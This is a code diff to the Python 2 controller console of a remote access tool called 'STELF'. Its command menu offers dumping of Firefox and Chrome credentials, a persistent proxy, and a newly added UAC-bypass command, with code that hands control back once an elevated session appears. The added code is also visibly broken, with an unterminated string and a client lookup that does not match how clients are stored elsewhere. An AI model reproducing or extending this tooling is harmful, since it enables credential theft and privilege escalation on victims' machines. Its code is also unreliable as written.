@@ -76,11 +76,11 @@ class Client:
 			data = ""
 			while not data.endswith(chr(255)):
 				c = self.sock.recv(4096)
-				if not c: raise Exception("[-] Client Disconnected")
+				if not c: raise Exception("Client Disconnected")
 				data += c
 		except Exception as e:
 			self.sock.settimeout(None)
-			raise Exception("[-]Client Disconnected")
+			raise Exception("Client Disconnected")
 		
 		self.sock.settimeout(None)
 		return self.decrypt(data)
@@ -178,9 +178,11 @@ class Client:
 				print " - prompt - Modify the prompt aesthetics,"
 				print " - crash - Crash the shell like Ayrton Senna,"
 				print " - test - Test the connection like a baws,"
-				print " - proxy - Start the always running proxy WARNING: Does not stop! Ever!"
+				print " - proxy [start] - Start the always running proxy WARNING: Does not stop! Ever!"
 				print " - dumpff - Dump Firefox Credientials,"
 				print " - dumpchrome - Dump Chrome Credientials."
+				print " - isadmin - Prints whether the current process has admin privileges.
+				print " - bypassuac - Attempts to bypass UAC."
 			else:
 				try:
 					if not user_input: continue
@@ -200,8 +202,13 @@ class Client:
 					self.make_prompt(data_package)
 			
 					sys.stdout.write(data_package["data"])
+					if data_package["data"].startswith("A new session with admin privileges should appear."):
+						raise Exception("Going back to handler due to bypassuac.")
 				
 				except Exception as e:
+						if str(e) == "Going back to handler due to bypassuac.":
+							print INFO + str(e)
+							break
 						print BAD + str(e)
 						del handler.clients[self.id]
 						break
@@ -264,7 +271,7 @@ class Handler:
 				sys.stdout.flush()
 			
 	def start(self):
-		print INFO + "STELF HAS STARTED BABY"
+		print INFO + "STELF handler ready."
 		t = threading.Thread(target=self.accept_clients)
 		t.daemon = True
 		t.start()
@@ -286,11 +293,17 @@ class Handler:
 				try:
 					req_id = int(user_input.split()[1])
 					self.interacting = True
-					self.clients[req_id].interact()
+					found = False
+					for client in self.clients:
+						if client.id == req_id:
+							found = True
+							client.interact()
+					if not found: print BAD + "ID not found."
 					self.interacting = False
 				except Exception as e:
 					self.interacting = False
-					print BAD + str(e)
+					if not str(e).startswith("list assignment"):
+						print BAD + str(e)
 					
 			elif user_input == "exit":
 				print INFO + "User requested shutdown."
